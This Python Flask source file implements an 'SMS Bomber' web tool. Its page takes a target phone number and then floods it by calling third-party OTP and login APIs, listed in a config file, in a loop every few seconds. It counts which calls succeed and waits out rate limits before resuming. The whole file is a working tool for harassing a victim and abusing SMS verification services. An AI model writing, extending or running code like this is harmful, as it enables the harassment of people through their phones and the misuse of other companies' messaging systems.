import json
import aiohttp
import asyncio
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Load API configuration from api.json
with open("api.json", "r") as file:
    config = json.load(file)

# Global variables
success_count = 0
failure_count = 0
total_requests_sent = 0
api_cooldown = {}
is_running = False  # Flag to control the loop

async def make_request(session, api, phone_number):
    global success_count, failure_count, total_requests_sent

    url = api["url"].format(phone_number=phone_number)
    params = api.get("params", {})
    headers = api.get("headers", {})

    # Formatting parameters if necessary
    if "params" in api:
        for key in api["params"]:
            if isinstance(api["params"][key], str) and "{phone_number}" in api["params"][key]:
                api["params"][key] = api["params"][key].format(phone_number=phone_number)
            elif api["name"] == "housing_login_send_otp":
                api["params"] = api["params"].format(phone_number=phone_number)

    # Handle cooldown logic
    if api["name"] in api_cooldown:
        cooldown_time = api_cooldown[api["name"]]
        if time.time() < cooldown_time:
            print(f"API {api['name']} is in cooldown. Skipping request.")
            return

    try:
        if api["method"] == "POST":
            async with session.post(url, headers=headers, json=params) as response:
                await handle_response(api, response)
        elif api["method"] == "GET":
            async with session.get(url, headers=headers, params=params) as response:
                await handle_response(api, response)

    except aiohttp.ClientError as e:
        failure_count += 1
        print(f"Request failed for {api['name']} with error: {e}")

async def handle_response(api, response):
    global success_count, failure_count, total_requests_sent

    total_requests_sent += 1
    print(f"Response from {api['name']}: Status Code {response.status}")

    if response.status == 400 or response.status == 429:
        print(await response.text())
        cooldown_time = time.time() + 5
        api_cooldown[api["name"]] = cooldown_time
        print(f"API {api['name']} hit rate limit or bad request. Cooling down for 5 seconds.")
        failure_count += 1
    elif api["identifier"] in await response.text():
        success_count += 1
        print(f"API {api['name']} request was successful.")
    else:
        failure_count += 1
        print(f"API {api['name']} failed: Identifier not found.")

async def run_requests(phone_number):
    global success_count, failure_count, total_requests_sent, is_running

    async with aiohttp.ClientSession() as session:
        while is_running:  # Keep running until is_running is False
            tasks = []
            for api in config["api"]:
                task = make_request(session, api, phone_number)
                tasks.append(task)

            await asyncio.gather(*tasks)
            await asyncio.sleep(3)  # Adjust the delay as required

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMS Bomber</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background-color: #f8f9fa;
                padding: 20px;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
            }
            .btn-primary {
                margin-right: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="text-center mb-4">SMS Bomber</h1>
            <form id="smsForm">
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Phone Number</label>
                    <input type="text" class="form-control" id="phoneNumber" placeholder="Enter phone number" required>
                </div>
                <button type="button" class="btn btn-primary" id="startBtn">Start</button>
                <button type="button" class="btn btn-danger" id="stopBtn">Stop</button>
            </form>
            <div id="status" class="mt-4"></div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            document.getElementById('startBtn').addEventListener('click', async () => {
                const phoneNumber = document.getElementById('phoneNumber').value;
                if (!phoneNumber) {
                    alert('Please enter a phone number.');
                    return;
                }

                const response = await fetch('/start', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `phone_number=${phoneNumber}`,
                });

                const data = await response.json();
                document.getElementById('status').innerHTML = `<div class="alert alert-success">Started bombing ${data.phone_number}!</div>`;
            });

            document.getElementById('stopBtn').addEventListener('click', async () => {
                const response = await fetch('/stop', {
                    method: 'POST',
                });

                const data = await response.json();
                document.getElementById('status').innerHTML = `
                    <div class="alert alert-danger">
                        Stopped!<br>
                        Total Requests Sent: ${data.total_requests_sent}<br>
                        Successful Requests: ${data.successful_requests}<br>
                        Failed Requests: ${data.failed_requests}
                    </div>`;
            });
        </script>
    </body>
    </html>
    '''

@app.route('/start', methods=['POST'])
def start():
    global is_running
    is_running = True
    phone_number = request.form.get('phone_number')

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_requests(phone_number))

    return jsonify({
        "status": "started",
        "phone_number": phone_number
    })

@app.route('/stop', methods=['POST'])
def stop():
    global is_running
    is_running = False
    return jsonify({
        "status": "stopped",
        "total_requests_sent": total_requests_sent,
        "successful_requests": success_count,
        "failed_requests": failure_count
    })

if __name__ == "__main__":
    app.run(debug=True)
